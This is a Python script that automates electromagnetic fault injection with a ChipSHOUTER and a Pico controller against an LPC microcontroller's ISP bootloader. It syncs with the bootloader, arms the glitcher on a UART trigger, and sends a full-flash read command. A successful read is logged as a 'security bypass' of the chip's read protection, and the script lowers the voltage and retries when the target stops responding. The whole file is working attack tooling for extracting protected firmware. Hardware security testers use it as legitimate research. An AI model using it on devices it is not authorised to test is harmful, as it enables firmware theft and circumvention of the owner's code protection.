#!/usr/bin/env python3
"""
ChipSHOUTER LPC Bootloader Glitch Test Script

This script tests glitching the LPC bootloader using the ChipSHOUTER.
It performs a complete glitch test sequence:
1. Reboots the Pico
2. Sets target to LPC
3. Syncs with LPC bootloader
4. Configures UART trigger (0x0d)
5. Sets ChipSHOUTER to hardware trigger high
6. Arms ChipSHOUTER (or verifies already armed)
7. Arms Pico trigger
8. Sends read command "R 0 516096"
9. Checks result: "19" = fail, "0" = success
"""

import serial
import time
import sys
import argparse

SERIAL_PORT = '/dev/ttyACM0'
BAUD_RATE = 115200
TIMEOUT = 2.0


def send_command(ser, cmd, wait_time=0.2, verbose=False):
    """Send a command to the Pico and return the response."""
    if verbose:
        print(f">>> {cmd}")

    # Clear any pending data first
    if ser.in_waiting > 0:
        ser.read(ser.in_waiting)

    ser.write(f"{cmd}\r\n".encode())

    # For ChipSHOUTER commands, poll for response over longer period
    if cmd.startswith("CS "):
        response = ""
        max_wait = 3.0  # Maximum 3 seconds to wait
        start_time = time.time()

        while time.time() - start_time < max_wait:
            time.sleep(0.1)
            if ser.in_waiting > 0:
                chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
                response += chunk
                # If we see the ChipSHOUTER prompt, we're done
                if "#" in chunk:
                    break

        if verbose and response.strip():
            print(response.strip())
        return response
    else:
        # Normal command - just wait for the specified time
        time.sleep(wait_time)
        response = ""
        if ser.in_waiting > 0:
            response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            if verbose and response.strip():
                print(response.strip())
        return response


def wait_for_response(ser, expected_text, timeout=5.0, verbose=False):
    """Wait for a specific response text."""
    start_time = time.time()
    full_response = ""

    while time.time() - start_time < timeout:
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            full_response += chunk
            if verbose:
                print(chunk, end='', flush=True)

            if expected_text in full_response:
                return True, full_response

        time.sleep(0.01)

    return False, full_response


def reboot_pico(ser, verbose=False):
    """Reboot the Pico, reconnect, then reset ChipSHOUTER."""
    if verbose:
        print("Rebooting Pico...")

    try:
        # Reboot Pico first
        send_command(ser, "REBOOT", wait_time=0.1, verbose=verbose)
        ser.close()
    except:
        pass

    # Wait for reboot to complete
    time.sleep(3.0)

    # Reconnect to Pico
    max_retries = 10
    for retry in range(max_retries):
        try:
            ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
            time.sleep(0.5)
            if verbose:
                print("Reconnected to Pico")
            break
        except (serial.SerialException, OSError):
            if retry < max_retries - 1:
                time.sleep(0.5)
            else:
                raise Exception("Failed to reconnect to Pico after reboot")

    # Now reset ChipSHOUTER
    if verbose:
        print("Resetting ChipSHOUTER...")

    try:
        response = send_command(ser, "CS RESET", wait_time=0.5, verbose=verbose)
        time.sleep(5.0)  # Give ChipSHOUTER time to fully reset
        if verbose:
            print("ChipSHOUTER reset complete")
    except Exception as e:
        if verbose:
            print(f"Warning: ChipSHOUTER reset error: {e}")

    return ser


def setup_lpc_target(ser, verbose=False):
    """Set target to LPC and perform sync."""
    if verbose:
        print("\nSetting up LPC target...")

    # Set target type
    response = send_command(ser, "TARGET LPC", wait_time=0.2, verbose=verbose)
    if "OK:" not in response and "Target type set" not in response:
        raise Exception(f"TARGET LPC command failed - response: {response}")

    # Perform sync
    if verbose:
        print("Syncing with LPC bootloader...")

    ser.write(b"TARGET SYNC 115200 12000 10\r\n")

    # Wait for sync completion
    success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=5.0, verbose=verbose)

    if not success:
        raise Exception("Failed to sync with LPC bootloader")

    if verbose:
        print("LPC bootloader sync complete")


def configure_glitch(ser, voltage=350, pulse_width=8000, verbose=False):
    """Configure trigger and ChipSHOUTER settings."""
    if verbose:
        print(f"\nConfiguring glitch parameters (V={voltage}, Pulse={pulse_width} cycles)...")

    # Set ChipSHOUTER voltage
    response = send_command(ser, f"CS VOLTAGE {voltage}", wait_time=0.5, verbose=verbose)
    if "#" not in response:
        raise Exception(f"CS VOLTAGE command failed - no ChipSHOUTER prompt in response: '{response}'")

    # Set Pico glitch pulse width (in cycles)
    response = send_command(ser, f"SET WIDTH {pulse_width}", wait_time=0.2, verbose=verbose)
    if "OK:" not in response:
        raise Exception(f"SET WIDTH command failed - response: {response}")

    # Set UART trigger to 0x0d
    response = send_command(ser, "TRIGGER UART 0d", wait_time=0.2, verbose=verbose)
    if "OK:" not in response:
        raise Exception(f"TRIGGER UART command failed - response: {response}")

    # Set ChipSHOUTER to hardware trigger high
    # This command does not expect a response, just send and wait
    ser.write(b"CS TRIGGER HARDWARE HIGH\r\n")
    if verbose:
        print(">>> CS TRIGGER HARDWARE HIGH")
    time.sleep(0.5)  # Short delay for command to be processed


def perform_glitch_test(ser, verbose=False):
    """Perform the actual glitch test."""
    if verbose:
        print("\nPerforming glitch test...")

    # Arm ChipSHOUTER (may already be armed)
    response = send_command(ser, "CS ARM", wait_time=1.0, verbose=verbose)

    # Validate ChipSHOUTER response - should contain "#" prompt
    if "#" not in response:
        raise Exception(f"CS ARM command failed - no ChipSHOUTER prompt in response: '{response}'")

    # Check if ChipSHOUTER returned an error
    if "Error: Change System State not allowed" in response or "fault] CMD-> arm" in response:
        # Already armed, this is expected
        if verbose:
            print("ChipSHOUTER already armed (this is OK)")
    elif "# arm" in response or "# arming" in response:
        # Successfully armed or arming
        if verbose:
            print("ChipSHOUTER armed successfully")
    else:
        # Unexpected response
        raise Exception(f"Failed to arm ChipSHOUTER - unexpected response: '{response}'")

    # Delay after arming ChipSHOUTER
    time.sleep(0.5)

    # Arm Pico trigger
    response = send_command(ser, "ARM ON", wait_time=0.2, verbose=verbose)
    if "OK:" not in response and "armed" not in response.lower():
        raise Exception(f"ARM ON command failed - response: {response}")

    # Send read command to target (this will trigger the glitch)
    if verbose:
        print("Sending target command: R 0 516096")

    ser.write(b'TARGET SEND "R 0 516096"\r\n')

    # Wait for response
    time.sleep(1.0)

    response = ""
    if ser.in_waiting > 0:
        response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
        if verbose:
            print(response)

    # Parse the response to determine glitch result
    # Response "19" means glitch failed (normal operation - error code)
    # Response "0" means glitch succeeded (security bypass)
    # No response means glitch failed (target hung/crashed)

    if "19" in response:
        return "FAILED_ERROR19"
    elif "No response data" in response or not response.strip():
        return "FAILED_NO_RESPONSE"
    elif "0" in response and "19" not in response:
        return "SUCCESS"
    else:
        return "UNKNOWN"


def perform_quick_glitch_test(ser, verbose=False):
    """Perform a quick glitch test (sync target, arm, and send)."""
    if verbose:
        print("\nPerforming quick glitch test...")

    # Sync with bootloader
    ser.write(b"TARGET SYNC 115200 12000 10\r\n")

    # Wait for sync completion
    success, response = wait_for_response(ser, "LPC ISP sync complete", timeout=5.0, verbose=verbose)

    if not success:
        raise Exception("Failed to sync with LPC bootloader")

    # Arm Pico trigger (ChipSHOUTER already armed and configured)
    response = send_command(ser, "ARM ON", wait_time=0.2, verbose=verbose)
    if "OK:" not in response and "armed" not in response.lower():
        raise Exception(f"ARM ON command failed - response: {response}")

    # Send read command to target (this will trigger the glitch)
    if verbose:
        print("Sending target command: R 0 516096")

    ser.write(b'TARGET SEND "R 0 516096"\r\n')

    # Wait for response
    time.sleep(1.0)

    response = ""
    if ser.in_waiting > 0:
        response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
        if verbose:
            print(response)

    # Parse the response to determine glitch result
    if "19" in response:
        return "FAILED_ERROR19"
    elif "No response data" in response or not response.strip():
        return "FAILED_NO_RESPONSE"
    elif "0" in response and "19" not in response:
        return "SUCCESS"
    else:
        return "UNKNOWN"


def run_glitch_test(num_iterations=1, voltage=350, pulse_width=8000, voltage_step=10, verbose=True):
    """Run the complete glitch test sequence."""

    success_count = 0
    fail_error19_count = 0
    fail_no_response_count = 0
    unknown_count = 0

    print(f"ChipSHOUTER LPC Bootloader Glitch Test")
    print("=" * 60)

    # Track timing
    start_time = time.time()

    ser = None
    current_voltage = voltage

    for iteration in range(num_iterations):
        if num_iterations > 1:
            print(f"\nIteration {iteration + 1}/{num_iterations}")
            print("-" * 60)

        # Voltage reduction loop - retry with lower voltage on no-response
        voltage_retry = 0
        while True:
            try:
                # First iteration: full setup
                if iteration == 0 and voltage_retry == 0:
                    # Connect to Pico
                    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
                    time.sleep(0.5)

                    # Reboot Pico for clean state
                    ser = reboot_pico(ser, verbose=verbose)

                    # Setup LPC target and sync
                    setup_lpc_target(ser, verbose=verbose)

                    # Configure glitch parameters
                    configure_glitch(ser, voltage=current_voltage, pulse_width=pulse_width, verbose=verbose)

                    # Perform glitch test
                    result = perform_glitch_test(ser, verbose=verbose)
                elif voltage_retry > 0:
                    # Voltage retry: reconfigure voltage and test
                    if verbose:
                        print(f"\nRetrying with reduced voltage: {current_voltage}V")

                    # Update ChipSHOUTER voltage
                    response = send_command(ser, f"CS VOLTAGE {current_voltage}", wait_time=0.5, verbose=verbose)
                    if "#" not in response:
                        raise Exception(f"CS VOLTAGE command failed - no ChipSHOUTER prompt in response: '{response}'")

                    # Perform quick glitch test
                    result = perform_quick_glitch_test(ser, verbose=verbose)
                else:
                    # Subsequent iterations: quick test (no setup needed)
                    result = perform_quick_glitch_test(ser, verbose=verbose)

                # Check result and decide whether to retry with lower voltage
                if result == "SUCCESS":
                    print("\n✓ GLITCH SUCCESS - Security bypass detected!")
                    success_count += 1
                    break  # Exit voltage retry loop
                elif result == "FAILED_ERROR19":
                    print("\n✗ GLITCH FAILED - Normal operation (error 19)")
                    fail_error19_count += 1
                    break  # Exit voltage retry loop
                elif result == "FAILED_NO_RESPONSE":
                    print(f"\n✗ GLITCH FAILED - No response from target (V={current_voltage})")
                    # Try reducing voltage if we have headroom
                    if current_voltage > voltage_step:
                        current_voltage -= voltage_step
                        voltage_retry += 1
                        fail_no_response_count += 1
                        if verbose:
                            print(f"Reducing voltage to {current_voltage}V and retrying...")
                        continue  # Retry with lower voltage
                    else:
                        # Voltage too low, can't reduce further
                        print(f"Voltage too low ({current_voltage}V), cannot reduce further")
                        fail_no_response_count += 1
                        break  # Exit voltage retry loop
                else:
                    print("\n? GLITCH UNKNOWN - Unexpected response")
                    unknown_count += 1
                    break  # Exit voltage retry loop

            except Exception as e:
                print(f"\n✗ ERROR: {e}")
                fail_error19_count += 1  # Count exceptions as failures
                try:
                    if ser:
                        ser.close()
                        ser = None
                except:
                    pass
                # For errors, we need to reconnect
                if iteration < num_iterations - 1:
                    try:
                        ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
                        time.sleep(0.5)
                    except:
                        pass
                break  # Exit voltage retry loop on exception

        # Reset voltage for next iteration
        current_voltage = voltage

        # Small delay between iterations
        if iteration < num_iterations - 1:
            time.sleep(0.5)

    # Close serial connection
    if ser:
        try:
            ser.close()
        except:
            pass

    # Calculate timing
    end_time = time.time()
    total_time = end_time - start_time
    time_per_attempt = total_time / num_iterations if num_iterations > 0 else 0

    # Print summary
    if num_iterations > 1:
        total_failed = fail_error19_count + fail_no_response_count
        print("\n" + "=" * 60)
        print("Test Summary:")
        print(f"  Glitch Success:      {success_count}/{num_iterations}")
        print(f"  Failed (Error 19):   {fail_error19_count}/{num_iterations}")
        print(f"  Failed (No Response):{fail_no_response_count}/{num_iterations}")
        print(f"  Unknown:             {unknown_count}/{num_iterations}")
        print(f"  Success Rate:        {(success_count / num_iterations) * 100:.1f}%")
        print(f"\nTiming:")
        print(f"  Total Time:          {total_time:.2f}s")
        print(f"  Time per Attempt:    {time_per_attempt:.2f}s")


def main():
    parser = argparse.ArgumentParser(
        description='Test ChipSHOUTER glitching of LPC bootloader'
    )
    parser.add_argument(
        '-n', '--num-iterations',
        type=int,
        default=1,
        help='Number of glitch test iterations to run (default: 1)'
    )
    parser.add_argument(
        '-v', '--voltage',
        type=int,
        default=350,
        help='ChipSHOUTER voltage (default: 350)'
    )
    parser.add_argument(
        '-p', '--pulse-width',
        type=int,
        default=8000,
        help='Pico glitch pulse width in cycles (default: 8000)'
    )
    parser.add_argument(
        '--voltage-step',
        type=int,
        default=10,
        help='Voltage reduction step on no-response failures (default: 10)'
    )
    parser.add_argument(
        '-q', '--quiet',
        action='store_true',
        help='Suppress verbose output'
    )

    args = parser.parse_args()

    try:
        run_glitch_test(
            num_iterations=args.num_iterations,
            voltage=args.voltage,
            pulse_width=args.pulse_width,
            voltage_step=args.voltage_step,
            verbose=not args.quiet
        )
    except KeyboardInterrupt:
        print("\n\nTest interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\nFatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
